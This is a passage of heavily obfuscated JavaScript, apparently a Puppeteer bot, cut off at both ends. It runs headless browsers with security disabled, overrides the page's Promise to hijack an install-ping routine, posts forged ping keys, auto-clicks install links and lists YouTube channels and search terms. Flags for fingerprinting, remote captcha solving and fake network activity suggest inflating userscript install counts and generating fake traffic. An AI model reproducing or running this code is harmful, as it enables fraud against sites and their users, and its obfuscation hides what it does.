0xb3a & N++], P[N >> 0x827 * -0x1 + 0x567 * -0x3 + 0x185e * 0x1] |= (0x1d0b * -0x1 + -0x5 * -0x4bf + -0x6 * -0xf8 | L >> 0x5 + 0x9 * 0x1cd + -0x102e & -0x1ad1 * -0x1 + 0x1e0f + 0x38a1 * -0x1) << y[-0xac * -0x39 + -0x7 * 0x286 + 0x149f * -0x1 & N++], P[N >> 0x439 + 0x40b * -0x3 + 0x7ea] |= (0xd17 + -0x1869 + 0x59 * 0x22 | L >> -0x19d + 0x17ca + -0x35 * 0x6b & -0x30b + -0x4 * -0xca + -0x22 * -0x1) << y[-0x5e8 + 0x1988 * -0x1 + 0x1f73 * 0x1 & N++], P[N >> -0x2268 + 0x24d3 + -0x269] |= (-0x2 * 0x22b + 0xc73 * -0x2 + 0x1dbc | 0x2254 + 0x1584 + -0x3799 & L) << y[-0x3 * -0x60d + -0x1 * -0x15b9 + -0x27dd & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x711 + 0x2097 + -0x1946 ? (this['block'] = P[0x31 * -0x8 + 0x90f + 0xd * -0x93], this['start'] = N - (0x481 + -0x1746 + 0x1305), this['hash'](), this['hashed'] = 0x26a8 + -0x155d + -0x114a * 0x1) : this['start'] = N;
                }
                return this['bytes'] > 0x1a7a315db * -0x1 + -0x48d4cd68 + 0x3f08b3e * 0xbf && (this['hBytes'] += this['bytes'] / (-0x161086 * -0xef0 + 0x6 * 0x1254b56a + -0xb793121c) << 0x1 * -0x1247 + -0x4fb + 0x1742, this['bytes'] = this['bytes'] % (0x1 * 0x1dd7c3274 + 0x1a9f2bcc + -0xf81b5e40)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x388 + -0x1f26 + 0x1b9f;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0xb06 + -0xa * -0x24a + -0xbce] = this['block'], J[K >> -0xe9a + 0x830 + 0x66c] |= x[-0x35 * 0xae + 0xea2 * -0x1 + 0x32ab & K], this['block'] = J[0x1 * 0x657 + -0x5ac + -0x1f * 0x5], K >= -0xc89 * 0x2 + -0x389 * -0x2 + -0x1a8 * -0xb && (this['hashed'] || this['hash'](), J[-0x202a + 0x4f * -0x2 + 0x20c8] = this['block'], J[0x16 * 0x11b + -0x1152 + -0x6f0] = J[-0x1cd5 + -0x15f4 + 0x32ca] = J[0x1b21 + 0xcec * 0x2 + 0x1 * -0x34f7] = J[0x8d2 * -0x3 + -0x1d5 * -0xc + -0x1 * -0x47d] = J[-0xa44 + -0x2 * 0x101c + 0x10 * 0x2a8] = J[-0x10ff + -0x1 * -0x1807 + -0x703] = J[-0xc11 + 0x1 * 0x2531 + -0x191a] = J[0x1c8 * 0x5 + -0x7 * -0x3d0 + -0x25f * 0xf] = J[-0x659 + 0x791 + -0x4c * 0x4] = J[-0x1072 + -0xb5 * -0x1 + -0x1 * -0xfc6] = J[0x140f + 0x8fe + 0x1d03 * -0x1] = J[0x2065 + 0x1f37 + -0x3f91] = J[-0x59c + -0x13e9 + 0x253 * 0xb] = J[0x7d0 + 0x1ca * 0x15 + -0x2d55 * 0x1] = J[0x236a + -0x98b + 0x1 * -0x19d1] = J[-0x329 * -0x3 + -0x8 * 0x1cc + 0x4f4] = 0x266e + 0xd * 0x1a3 + -0x13e7 * 0x3), J[-0x2266 * -0x1 + -0x1e1f + -0x439] = this['hBytes'] << 0x2405 * -0x1 + 0x1d * -0x76 + 0x3166 * 0x1 | this['bytes'] >>> 0x123 * 0x1b + -0x5 * 0x124 + -0x18e0, J[-0x2413 + -0x325 + 0x1 * 0x2747] = this['bytes'] << -0x2603 + 0xc34 + 0x19d2, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x13ec + -0x2 * 0xc46 + 0x2c88; J < 0x699 * 0x3 + 0x4 * 0x2c9 + -0x1e9f; ++J)
                K = Q[J - (-0x2284 + 0x176b + 0xb1c)] ^ Q[J - (0x738 + 0x2656 * -0x1 + 0x1f26)] ^ Q[J - (0x23bd + -0x35 * -0xa3 + 0x1 * -0x456e)] ^ Q[J - (0xb35 * 0x1 + 0x10a6 * 0x1 + -0x1bcb * 0x1)], Q[J] = K << -0x3b0 + -0x569 + -0x1d2 * -0x5 | K >>> -0xe2 * 0x2b + -0x71a + 0x2d2f;
              for (J = -0x224e + -0x30d + 0x49 * 0x83; J < 0x5 * 0x41f + -0x11 * 0x237 + 0x1120; J += -0x1 * 0x1cb2 + 0x1e5f + 0x2 * -0xd4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5 * 0x301 + -0x15d3 + -0x1 * -0x24dd | L >>> 0x17d8 + 0xe18 + 0x95 * -0x41) + (M & N | ~M & O) + P + (0x652636b2 + 0x1 * 0x29953fd + -0x1 * 0xd3d1116) + Q[J] << -0x24e1 + -0x23bb + 0x1227 * 0x4) << -0x2 * -0x497 + 0x40 * -0x2 + -0x8a9 | P >>> 0x18be + -0x3f9 + 0x1 * -0x14aa) + (L & (M = M << 0x1 * 0x971 + 0x2417 + -0x2d6a | M >>> -0x2496 + 0xf * -0xd + 0x255b * 0x1) | ~L & N) + O + (0x1 * -0x1e469b5b + -0x641dd6dd * 0x1 + 0xdce6ebd1) + Q[J + (0x6cd * -0x2 + -0x23e0 + 0x317b)] << -0x3b5 + -0x7e1 + 0xb96) << 0x293 + -0x1013 * -0x2 + -0x22b4 | O >>> 0x1974 + 0x173e + -0x3097) + (P & (L = L << 0x22 * -0x71 + 0x14 * -0x1b5 + 0x3144 | L >>> 0xbe3 * -0x1 + 0x1770 + 0x3d9 * -0x3) | ~P & M) + N + (-0x92d4faea + -0x761d * 0x154b2 + 0x18a8818ad) + Q[J + (-0x338 * -0x2 + -0x3 * 0x35 + 0x5cf * -0x1)] << -0x107 * -0xc + -0x32 * -0x1d + -0x7 * 0x292) << 0x12cf + 0x29 * 0x67 + 0x1 * -0x2349 | N >>> -0x150d + -0x3 * 0x949 + 0x3103) + (O & (P = P << 0xe96 + -0x7e9 + -0x68f * 0x1 | P >>> 0x266e * 0x1 + 0x1 * -0xc97 + -0x19d5) | ~O & L) + M + (0x8d8f7cc4 + 0x67b4 * 0xf679 + 0xe125 * -0xab93) + Q[J + (0x1c7 + 0xc2 + -0x286 * 0x1)] << -0x75e + -0xbf3 + 0x1351) << 0x603 + 0x11c4 + -0x17c2 | M >>> 0x1 * 0x1ae6 + -0x70a + -0x13c1) + (N & (O = O << 0x6b9 * 0x5 + -0x17a7 + -0x78 * 0x15 | O >>> 0x1bc4 * -0x1 + 0x14f * -0x18 + 0x3b2e) | ~N & P) + L + (-0x49e76188 + -0x21630fa * -0x1 + 0xa253aa27) + Q[J + (-0x14df + 0x3e * -0x2b + -0x3 * -0xa6f)] << -0xe51 + 0x870 + 0x23 * 0x2b, N = N << -0xd18 + -0x1bf0 + 0x2926 | N >>> -0x20 * 0x60 + 0x2b * 0x3 + 0xb81;
              for (; J < 0x1a * -0x44 + 0x4 * -0x584 + -0x1d20 * -0x1; J += 0x1 * -0x5ce + -0x1079 + 0x164c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x637 + 0x108 * -0x16 + 0x83f * 0x2 | L >>> 0x2097 + 0x1 * -0x13c3 + -0xcb9) + (M ^ N ^ O) + P + (0x1 * 0x3e76634e + 0x4f42ef86 + -0x1edf6733) + Q[J] << -0x90c + -0x1 + 0x90d) << 0x1b8f + 0x1e9b + -0x3a25 | P >>> -0x98 * -0x3e + -0x2 * 0xeef + -0x1 * 0x6d7) + (L ^ (M = M << -0x6e1 + -0xa75 * -0x2 + 0x1fd * -0x7 | M >>> -0xd54 + 0xdf8 + -0x2 * 0x51) ^ N) + O + (-0xd37228f * -0xf + -0x849a4aa9 + 0x2d392fe9) + Q[J + (-0xb * 0x167 + 0x337 * -0x2 + 0xaee * 0x2)] << 0x1926 + 0x2 * -0x128c + -0x116 * -0xb) << 0x151 * 0xe + 0xb5 * -0x5 + -0xee0 | O >>> -0x1 * -0x1061 + 0x1108 + -0x2 * 0x10a7) + (P ^ (L = L << 0x222b + -0x5f9 + -0x257 * 0xc | L >>> -0x2 * 0x745 + -0x1dd6 + 0x256 * 0x13) ^ M) + N + (-0xbb71dc7d + -0x41c * -0x2e1fef + 0x6cc08dfa) + Q[J + (0x18cd + 0x1d1c + -0x35e7 * 0x1)] << 0x1 * 0x1057 + 0x1372 + 0x23c9 * -0x1) << -0x624 + -0x4 * -0x8ca + 0xd * -0x23b | N >>> -0x1bcc + 0x180f * -0x1 + -0x2e3 * -0x12) + (O ^ (P = P << 0x19c3 + 0x2 * -0x31a + -0x1 * 0x1371 | P >>> -0x7bb + 0x39 * -0x7b + 0x2320) ^ L) + M + (-0x5e7 * -0x91481 + -0xa5a5b03 * 0x2 + 0x18 * 0x33f9bd8) + Q[J + (0x2 * 0x853 + 0x1a05 + -0x2aa8)] << -0x109d * 0x1 + 0xd00 + 0x39d) << -0xf4a + -0x41a + 0x1369 * 0x1 | M >>> -0x12 * -0x1e6 + -0x39a * -0xa + -0x4615) + (N ^ (O = O << 0x1dc + -0x25c0 + -0x16 * -0x1a3 | O >>> 0xbf9 + 0x209a + -0x2c91 * 0x1) ^ P) + L + (-0x7f5caa85 + 0x3fa4c27 * 0x9 + 0xca69e8c7) + Q[J + (0x1d8d + 0x1eda + -0x3c63)] << 0x1b29 + -0x208b + 0x1 * 0x562, N = N << -0xb4 + 0x1b97 + -0x1ac5 | N >>> -0x1f46 + -0x2 * -0xa09 + 0xb36;
              for (; J < -0x2385 + -0x1 * -0x246b + -0xaa; J += 0x16c2 + 0x14fe + -0x2bbb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb0c + 0x1 * -0x222b + 0x1724 | L >>> -0x1f5 * 0xb + -0x3 * -0xa2 + 0x13bc) + (M & N | M & O | N & O) + P - (-0xdcb31ae4 * -0x1 + 0x42381fae + 0xf3 * -0xb7565a) + Q[J] << 0x1 * 0x1433 + 0x10a2 + -0x24d5) << 0x4 * 0x160 + 0x12a2 + -0x1 * 0x181d | P >>> -0xfbc + -0x3 * 0x1ac + -0x1 * -0x14db) + (L & (M = M << 0x2 * 0x527 + 0xe * -0x148 + 0x7c0 | M >>> -0x157a + -0x1425 + 0x29a1) | L & N | M & N) + O - (-0x3cd0fc9d + 0xd5dc6945 + -0x28272984) + Q[J + (0x26d2 + 0x1a0a + -0x40db * 0x1)] << -0x1336 * 0x1 + 0xa82 + -0x22d * -0x4) << 0xa5c + 0xe5 * -0x15 + 0x872 | O >>> 0x738 + 0x2278 + -0x2995) + (P & (L = L << 0x138 + 0x1e6c + -0x1f86 | L >>> -0x2a1 * -0x1 + -0x14d6 + 0x1237) | P & M | L & M) + N - (0xfc57d1 * 0x8e + 0x3129c5 * -0x25 + -0x13f96951) + Q[J + (-0x232b + -0x23ce + 0x46fb)] << 0x4 * -0x851 + -0x1 * -0x256 + 0x1 * 0x1eee) << 0x91 * -0xb + -0xf * -0x68 + 0x28 * 0x1 | N >>> -0x1709 + 0x1 * 0xd3d + 0x9e7) + (O & (P = P << 0x1139 + 0x1 * 0x727 + -0x1b * 0xe6 | P >>> -0x4ab * 0x8 + 0xa31 * -0x3 + 0x43ed * 0x1) | O & L | P & L) + M - (-0x1 * -0xa18703a1 + -0x2 * 0x65bcc8ff + 0x9ad6d181) + Q[J + (0x887 * -0x2 + 0x121d * -0x1 + 0x232e)] << 0x1426 + -0x2242 + 0xe1c) << -0x12ea + 0x1c2e + -0x93f | M >>> -0x1 * 0xc7d + 0x3 * -0x194 + 0x2 * 0x8aa) + (N & (O = O << -0x24e9 + -0x196 * 0x17 + 0x4981 * 0x1 | O >>> 0xb1 + -0x307 + 0x258) | N & P | O & P) + L - (0x7d8408aa + 0x14 * 0x8ad96ed + -0xba2f900a) + Q[J + (-0x1ab * -0x16 + 0x19a3 * -0x1 + 0x1 * -0xb0b)] << -0x2d * -0xa3 + -0x1 * -0x17f8 + -0x349f, N = N << 0x21ce + 0x25 * -0xcb + 0x173 * -0x3 | N >>> 0xdf3 * 0x1 + 0x948 + -0x1739;
              for (; J < -0x5bf + 0x246c + -0x1e5d; J += -0x1 * 0xe7d + 0x22e0 + 0x6ca * -0x3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x20b7 + -0x1 * -0xaf1 + -0x15cb * -0x1 | L >>> -0x25d1 + -0x6fb + 0x2ce7) + (M ^ N ^ O) + P - (-0x2 * -0x1b6d252d + 0x2f36491f + -0x3073554f) + Q[J] << 0x1bc1 + -0x127c + -0x7 * 0x153) << 0x19 * -0x9 + -0x8f4 + 0x2 * 0x4ed | P >>> -0xff + 0x1931 + -0x1817 * 0x1) + (L ^ (M = M << 0x1 * -0x70a + 0x24df * 0x1 + -0x1db7 | M >>> -0xc84 + 0x2 * -0xb6b + 0x235c) ^ N) + O - (0xdd9d33b * 0x5 + -0x1 * -0x5d6be081 + -0x9 * 0xc1e320e) + Q[J + (0x7ca + 0x20d9 * -0x1 + 0x191 * 0x10)] << -0x96 * 0x3e + 0x7 * -0x238 + 0x33dc) << -0x245d + -0x130 * -0x1a + 0x582 | O >>> -0x4 * 0x772 + -0x16d8 + 0x34bb) + (P ^ (L = L << -0xe76 + 0x7 * 0xec + 0x820 | L >>> 0x2163 + 0x1ff3 + -0x4154) ^ M) + N - (-0x5 * -0x1eae72b + -0x1b4c586a + 0x475312bd) + Q[J + (0xd60 + -0x2 + 0x6 * -0x23a)] << -0x2307 + -0x14c3 + 0x37ca) << 0x1e32 + 0xab5 + 0x28e2 * -0x1 | N >>> -0x1c * -0x117 + 0x1 * -0x2659 + -0x10 * -0x7f) + (O ^ (P = P << 0x611 * 0x1 + 0x10f3 + 0x1 * -0x16e6 | P >>> -0x7eb + -0x1 * 0xf52 + -0x1 * -0x173f) ^ L) + M - (-0x3494923b + 0xc36dce8 + -0x1f53a67f * -0x3) + Q[J + (-0x162e + 0x1c9 + 0x8 * 0x28d)] << -0x346 * -0x3 + -0x3e0 + -0x5f2) << -0x7d9 + 0xc5 * -0x1a + 0x1be0 | M >>> -0xa47 * 0x3 + 0xb0f + 0x13e1 * 0x1) + (N ^ (O = O << 0x1 * 0x6b6 + 0x19 * 0xd7 + -0x1b97 | O >>> -0x37d * 0xb + -0x16fd + 0x1eaf * 0x2) ^ P) + L - (-0x511df23f + -0x6b * 0x338e6a + 0x169 * 0x6ed31f) + Q[J + (-0x1667 + -0x2 * 0x85c + 0x2723)] << 0x1373 + -0x7a1 + 0xb2 * -0x11, N = N << 0x5b4 + 0x1246 + -0x7f4 * 0x3 | N >>> -0x2f * 0xb + -0x124e + 0x1455;
              this['h0'] = this['h0'] + L << 0xd3 + 0x13d8 + -0x14ab, this['h1'] = this['h1'] + M << -0x1edd + -0x2643 + -0x452 * -0x10, this['h2'] = this['h2'] + N << -0x13bf + -0x4b2 * 0x7 + -0x349d * -0x1, this['h3'] = this['h3'] + O << -0x10d5 + 0x7 * 0x2ef + 0x3b4 * -0x1, this['h4'] = this['h4'] + P << 0x258 * -0x2 + 0x1996 + -0x6b * 0x32;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xaf4 * -0x2 + 0x87d + -0x1e49 * 0x1 & 0x1 * -0x1f57 + 0x43 * 0x4f + -0x1 * -0xab9] + w[J >> 0x1bed + 0x679 + -0x224e & -0x19c6 + -0x51 * 0x1 + 0x1a26] + w[J >> 0x175 * -0x5 + 0x1086 + -0x929 & -0x1eae + 0xe75 + 0x1048] + w[J >> -0xafb + -0x267e + -0x3 * -0x1083 & -0x67b * -0x4 + 0x10 * 0x115 + -0x2b2d] + w[J >> 0x7 * 0x331 + -0xd3a + -0x911 & -0x1 * -0x1449 + -0x18b + 0x1 * -0x12af] + w[J >> -0x759 + -0x1f * -0x3d + -0x2 & -0x1 * 0x1de1 + -0x1479 * -0x1 + -0x1 * -0x977] + w[J >> -0x1589 * 0x1 + 0x13fc + 0x191 & -0x9e6 + 0x1e27 + -0x5e * 0x37] + w[0x8 * -0x371 + -0x1 * -0xce6 + 0x1 * 0xeb1 & J] + w[K >> -0xaa3 * 0x3 + -0x88 + 0x208d & 0x195b + 0x19 * -0xf7 + -0x12d] + w[K >> -0xb45 + -0xa13 * 0x1 + -0x31 * -0x70 & -0xd45 + -0x3c7 + 0x111b] + w[K >> 0x486 + 0xa7 * 0x1a + -0x1568 & -0x2 * 0x6dc + -0x17c9 * 0x1 + 0x2590] + w[K >> -0x80e + 0x3 * -0x399 + 0x67 * 0x2f & -0xcdf + -0x6ce * 0x5 + 0x2ef4] + w[K >> 0xb61 * 0x3 + -0xffb * 0x2 + -0x221 & -0x1 * -0x40f + 0x527 * -0x2 + -0x64e * -0x1] + w[K >> -0xfb * -0x26 + -0x102a + -0x1510 & -0x10a7 + 0x37a + 0xd3c] + w[K >> 0x105f + -0x828 + -0x833 & 0x387 * 0x2 + -0x1611 + 0xf12] + w[0xb60 + -0x2284 + 0x1733 & K] + w[L >> -0x817 + -0xddb + 0x160e & 0x1 * -0x23dd + -0x1660 + 0x3a4c] + w[L >> 0x927 + -0x9d9 + 0xca & -0x8f4 + 0x258f + -0x1c8c] + w[L >> 0x112d + 0x9e3 * 0x3 + -0x1761 * 0x2 & 0xf8f * 0x1 + -0x817 * 0x2 + 0x3 * 0x3a] + w[L >> -0x2275 + 0x262f + -0x43 * 0xe & 0x24f7 + -0xd * -0x13a + 0x2 * -0x1a6d] + w[L >> -0x1 * 0x621 + -0x17a1 + 0x7 * 0x442 & -0x2026 + -0xc66 + -0x1 * -0x2c9b] + w[L >> 0x4 * -0x4bd + -0x1392 + 0x268e & -0x1 * 0x167d + -0x18bc + 0x2f48] + w[L >> 0xa5b + -0x45 * -0x1a + 0x1 * -0x1159 & 0x142a + -0x1f82 + -0x15 * -0x8b] + w[-0x561 + -0x1346 * -0x1 + 0x6eb * -0x2 & L] + w[M >> -0x17a9 + 0x159a + 0x22b & 0x2 * 0x8f1 + -0xe2 * 0x19 + 0x43f] + w[M >> 0x11a9 + 0x23d5 * -0x1 + -0xa7 * -0x1c & 0xb2 * -0xd + -0x61 * -0x16 + 0xf * 0xd] + w[M >> 0x1 * -0x19c2 + 0x1 * -0xa9 + 0x1a7f & -0x1 * -0x1ad1 + 0x1d50 + -0x3812] + w[M >> -0x4c8 + -0x2669 + 0x1 * 0x2b41 & 0x12da + -0x1fac + 0x3 * 0x44b] + w[M >> 0x1 * 0x1ae3 + 0x252 * -0xa + -0x3a3 & 0x24a3 * 0x1 + -0xfaa + -0x1 * 0x14ea] + w[M >> 0x3 * -0x11f + -0x1f5b + 0x22c0 & -0x1 * -0x1f43 + 0xf * 0xd2 + 0x2b82 * -0x1] + w[M >> 0x10 * -0x1 + 0xaa0 + 0xb4 * -0xf & 0x17f4 + -0x1 * 0x2bc + 0x1 * -0x1529] + w[0x2 * -0x945 + 0x134b * -0x1 + 0x25e4 & M] + w[N >> -0x29 * 0xb3 + 0x4 * 0x1 + 0x1cc3 * 0x1 & -0x158d + -0x2 * 0x42a + 0x1df0] + w[N >> -0x13ec + -0x1829 + 0x2c2d & -0x1 * 0x649 + -0x9d * 0x2b + 0x68b * 0x5] + w[N >> 0x142f * -0x1 + -0x2172 + 0x35b5 & 0x18e5 + -0xa5f * -0x1 + 0x2335 * -0x1] + w[N >> -0x35 * -0x8e + -0xd47 * 0x2 + -0xb2 * 0x4 & 0x1 * -0x7f4 + 0x1a6 + 0x65d] + w[N >> 0x625 + -0xdc1 + 0x7a8 & -0x2703 + -0x2228 + -0x5a2 * -0xd] + w[N >> 0xa6 * -0x35 + -0xcc4 + 0x2f2a & -0x1e23 + -0x1 * 0x12c3 + 0x30f5] + w[N >> -0x51a * -0x1 + -0x57 * 0x62 + 0x1c38 & -0x1e1d + 0x2571 + 0x1 * -0x745] + w[0x1 * -0xa5f + -0x5 * -0x8d + 0x7ad & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x665 * -0x4 + 0x2 * -0xba5 + 0x1 * 0x30f6 & -0x2 * -0x54e + -0x2225 + 0x1888,
                J >> 0xce * -0x13 + -0x1 * 0x125b + 0x1 * 0x21b5 & -0xb7 * -0x19 + 0x828 + -0xc84 * 0x2,
                J >> -0x3a2 + -0x1c35 + -0x1fdf * -0x1 & -0x67f * -0x3 + -0x1c5e + 0x4 * 0x278,
                0x1 * 0x1073 + -0x1569 + -0x19 * -0x3d & J,
                K >> 0x1701 + -0xff + -0x15ea & 0x106 * 0xa + -0x238d * -0x1 + 0xb6 * -0x3f,
                K >> -0x9e * 0x3d + 0x1 * -0x36d + 0x2923 & -0xadc + 0x8 * -0x19d + 0x18c3,
                K >> -0x1895 * -0x1 + 0x235c + -0x3be9 & 0x25a4 + -0x1dc3 + -0x6e2,
                -0x5 * -0x359 + 0xe67 * -0x1 + -0x7 * 0x31 & K,
                L >> 0x3 * 0x351 + 0x71 * 0x1f + 0x17 * -0x106 & -0x1 * -0x15cd + 0x1f29 + 0x35 * -0xfb,
                L >> 0x1 * -0x6bc + -0x7a2 + -0x2 * -0x737 & 0x2a9 * -0x2 + -0x1240 + 0x1891,
                L >> 0x0 + -0x2b4 * -0xd + -0x231c & -0xb3 * 0x33 + -0x1fdd + 0x16d7 * 0x3,
                0x219f + -0x25df + 0x53f & L,
                M >> -0x1a3a + -0xd2b + -0x1 * -0x277d & 0x1af5 + 0x1601 + 0x1 * -0x2ff7,
                M >> 0x259f + 0x288 + 0x21 * -0x137 & 0x1 * -0x1d12 + -0x7fa + 0x260b,
                M >> 0x8 * -0x463 + 0x2 * -0xdda + 0xfb5 * 0x4 & 0x1 * -0x15db + 0x1895 + -0x1bb,
                -0x3 * 0x603 + 0x1982 + -0x67a & M,
                N >> -0x5d0 + -0x1768 + -0x10 * -0x1d5 & -0x5 * 0x783 + -0x2654 + -0x2f5 * -0x1a,
                N >> 0x605 + -0x133 * -0xc + -0x1459 * 0x1 & 0x2480 + -0x3 * -0xcda + -0x4a0f,
                N >> -0x5c7 + -0x85 * 0x13 + -0x1 * -0xfae & -0x148b + -0x3e * 0x1 + 0x15c8,
                0x2b * -0x21 + 0x9 * -0x34f + 0x9 * 0x409 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1a * 0xb + -0x192a + -0xc1 * -0x20), (K = new DataView(J))['setUint32'](-0x75 * -0x18 + -0x1eb * 0x3 + 0x1bd * -0x3, this['h0']), K['setUint32'](0x2 * -0x85f + -0x1009 + -0x17 * -0x16d, this['h1']), K['setUint32'](0x1 * -0x1ce1 + 0x1dbf + -0xd6, this['h2']), K['setUint32'](-0x15 * -0x1d2 + -0x6c9 + -0x3 * 0xa77, this['h3']), K['setUint32'](-0xb * -0x33d + -0x1165 + -0x60e * 0x3, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1136 + -0x7 * 0x423 + 0xbbf];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x2a5 * 0x7 + 0x3d * 0x56 + -0x1fb;
            J[-0x657 * 0x1 + -0x1bb1 + 0x2208]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1f9e + 0x1f * 0x101 + -0x3ebd] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * -0x41f + -0x1087 * 0x2 + 0x1cf0), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x19e9 + 0x92f * 0x1 + 0xd * -0x2b3;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x2209 + -0x1278 + 0x3a5d), Promise['resolve'](0x2a9 * -0xb + -0xb85 + -0x28c9 * -0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0xf65 + -0x1 * 0x98e + 0x3 * 0x851; j < 0x2 * -0xc86 + 0x191 * -0x1 + 0x1a9e; j++)
    i();
}
const NETWORK_PATIENCE = 0xfda * -0x2 + 0x1bc1 + 0x1 * 0x2333 + (-0x2e7 * -0x4 + 0xf8 * -0x1a + 0x194c) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x120e * -0x1 + 0x937 + 0x916 * -0x3) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x18de + 0x1ede + -0x37bc; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 